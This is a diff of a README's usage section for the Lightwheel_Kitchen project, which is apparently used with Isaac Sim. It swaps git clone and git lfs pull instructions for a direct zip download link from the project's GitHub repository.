@@ -33,13 +33,10 @@ For questions or collaboration, contact Frank Chen at ming.chen@lightwheel.ai.
 
 ## 🚀 Usage
 
-```bash 
-git clone https://github.com/LightwheelAI/Lightwheel_Kitchen.git 
+Download by clicking
 
-cd Lightwheel_Kitchen 
+https://github.com/LightwheelAI/Lightwheel_Kitchen/raw/refs/heads/main/Lightwheel_Kitchen.zip?download=
 
-git lfs pull 
-```
 
 
 1. Open **Isaac Sim**.
